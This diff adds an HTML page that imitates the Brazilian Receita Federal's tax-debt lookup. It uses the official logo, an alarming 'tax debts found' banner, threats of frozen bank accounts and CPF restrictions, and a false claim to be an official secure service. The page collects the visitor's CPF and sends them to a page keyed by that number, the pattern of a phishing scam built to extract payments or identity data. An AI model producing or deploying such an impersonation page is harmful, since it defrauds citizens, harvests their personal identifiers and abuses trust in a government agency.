@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Consulta de Débitos - Receita Federal do Brasil</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <style>
+        .font-rawline {
+            font-family: 'Rawline', 'Arial', sans-serif;
+        }
+        
+        @font-face {
+            font-family: 'Rawline';
+            src: url('/static/fonts/rawline-400.ea42a37247439622.woff2') format('woff2');
+            font-weight: 400;
+            font-style: normal;
+        }
+        
+        @font-face {
+            font-family: 'Rawline';
+            src: url('/static/fonts/rawline-600.844a17f0db94d147.woff2') format('woff2');
+            font-weight: 600;
+            font-style: normal;
+        }
+        
+        @font-face {
+            font-family: 'Rawline';
+            src: url('/static/fonts/rawline-700.1c7c76152b40409f.woff2') format('woff2');
+            font-weight: 700;
+            font-style: normal;
+        }
+    </style>
+</head>
+<body class="bg-gray-50 font-rawline">
+    <!-- Header -->
+    <header style="background: linear-gradient(135deg, #0c326f 0%, #1a4a8a 100%); color: white; padding: 20px 0;">
+        <div class="container mx-auto px-4">
+            <div class="flex items-center justify-between">
+                <div class="flex items-center space-x-4">
+                    <img src="https://www.gov.br/receitafederal/pt-br/assuntos/aduana-e-comercio-exterior/manuais/remessas-postal-e-expressa/calculadora-versao-iii/componentes/cabecalho/img/receita-federal-logo.png" 
+                         alt="Receita Federal" 
+                         class="h-12 w-auto"
+                         style="filter: brightness(0) invert(1);">
+                    <div>
+                        <h1 class="text-xl font-bold">RECEITA FEDERAL DO BRASIL</h1>
+                        <p class="text-sm opacity-90">Ministério da Fazenda</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <div class="min-h-screen py-12">
+        <div class="container mx-auto px-4 max-w-2xl">
+            <div class="bg-white rounded-lg shadow-lg overflow-hidden">
+                <!-- Alert Banner -->
+                <div style="background: linear-gradient(90deg, #dc3545 0%, #c82333 100%); color: white; padding: 15px;">
+                    <div class="flex items-center justify-center">
+                        <i class="fas fa-exclamation-triangle mr-3 text-xl"></i>
+                        <span class="font-semibold text-lg">DÉBITOS TRIBUTÁRIOS ENCONTRADOS</span>
+                    </div>
+                </div>
+
+                <div class="p-8">
+                    <div class="text-center mb-8">
+                        <h2 class="text-2xl font-bold text-gray-800 mb-4">CONSULTA DE DÉBITOS TRIBUTÁRIOS</h2>
+                        <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 text-left">
+                            <div class="flex">
+                                <div class="flex-shrink-0">
+                                    <i class="fas fa-info-circle text-yellow-400"></i>
+                                </div>
+                                <div class="ml-3">
+                                    <p class="text-sm text-yellow-700">
+                                        <strong>Foram identificados débitos em aberto em seu nome</strong> junto à Receita Federal do Brasil. 
+                                        Para consultar os valores e proceder com a regularização, digite seu CPF no campo abaixo.
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="bg-red-50 border border-red-200 rounded-lg p-6 mb-8">
+                        <h3 class="text-lg font-semibold text-red-800 mb-3">
+                            <i class="fas fa-clock mr-2"></i>
+                            PRAZO LIMITADO PARA REGULARIZAÇÃO
+                        </h3>
+                        <p class="text-red-700 text-sm leading-relaxed">
+                            O não pagamento dos débitos tributários pode resultar em:
+                        </p>
+                        <ul class="text-red-700 text-sm mt-3 space-y-1">
+                            <li><i class="fas fa-chevron-right mr-2 text-xs"></i>Bloqueio de contas bancárias</li>
+                            <li><i class="fas fa-chevron-right mr-2 text-xs"></i>Restrições no CPF</li>
+                            <li><i class="fas fa-chevron-right mr-2 text-xs"></i>Multas e juros adicionais</li>
+                            <li><i class="fas fa-chevron-right mr-2 text-xs"></i>Inscrição em dívida ativa</li>
+                        </ul>
+                    </div>
+                    
+                    <form id="cpfConsultaForm" class="space-y-6">
+                        <div>
+                            <label for="cpfInput" class="block text-sm font-semibold text-gray-700 mb-3">
+                                <i class="fas fa-id-card mr-2"></i>
+                                Digite seu CPF para consultar os débitos:
+                            </label>
+                            <input 
+                                type="text" 
+                                id="cpfInput" 
+                                name="cpf" 
+                                placeholder="000.000.000-00"
+                                maxlength="14"
+                                class="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-lg font-mono text-center"
+                                required
+                            >
+                            <p class="text-xs text-gray-500 mt-2 text-center">Digite apenas os números do seu CPF</p>
+                        </div>
+                        
+                        <button 
+                            type="submit" 
+                            class="w-full py-4 px-6 text-white font-semibold rounded-lg transition duration-200 text-lg"
+                            style="background: linear-gradient(135deg, #0c326f 0%, #1a4a8a 100%);"
+                            onmouseover="this.style.transform='translateY(-1px)'; this.style.boxShadow='0 4px 12px rgba(12, 50, 111, 0.3)'"
+                            onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='none'"
+                        >
+                            <i class="fas fa-search mr-3"></i>
+                            CONSULTAR DÉBITOS
+                        </button>
+                    </form>
+
+                    <div class="mt-8 text-center">
+                        <div class="bg-gray-50 rounded-lg p-4">
+                            <p class="text-xs text-gray-600">
+                                <i class="fas fa-shield-alt mr-1"></i>
+                                Consulta segura e oficial da Receita Federal do Brasil
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer style="background: #0c326f; color: white; padding: 30px 0;">
+        <div class="container mx-auto px-4 text-center">
+            <div class="flex items-center justify-center mb-4">
+                <img src="https://www.gov.br/receitafederal/pt-br/assuntos/aduana-e-comercio-exterior/manuais/remessas-postal-e-expressa/calculadora-versao-iii/componentes/cabecalho/img/receita-federal-logo.png" 
+                     alt="Receita Federal" 
+                     class="h-8 w-auto mr-3"
+                     style="filter: brightness(0) invert(1);">
+                <div class="text-left">
+                    <p class="font-semibold text-sm">RECEITA FEDERAL DO BRASIL</p>
+                    <p class="text-xs opacity-75">Ministério da Fazenda</p>
+                </div>
+            </div>
+            <p class="text-xs opacity-75">© 2025 Receita Federal do Brasil. Todos os direitos reservados.</p>
+        </div>
+    </footer>
+
+    <script>
+        // CPF formatting and form handling
+        document.addEventListener('DOMContentLoaded', function() {
+            const cpfInput = document.getElementById('cpfInput');
+            const form = document.getElementById('cpfConsultaForm');
+            
+            // Format CPF as user types
+            cpfInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                value = value.replace(/(\d{3})(\d)/, '$1.$2');
+                value = value.replace(/(\d{3})(\d)/, '$1.$2');
+                value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+                e.target.value = value;
+            });
+            
+            // Handle form submission
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const cpfValue = cpfInput.value.replace(/\D/g, ''); // Remove formatting
+                
+                if (cpfValue.length !== 11) {
+                    alert('Por favor, digite um CPF válido com 11 dígitos.');
+                    cpfInput.focus();
+                    return;
+                }
+                
+                // Redirect to /{cpf}
+                window.location.href = '/' + cpfValue;
+            });
+            
+            // Focus on CPF input when page loads
+            cpfInput.focus();
+        });
+    </script>
+</body>
+</html>
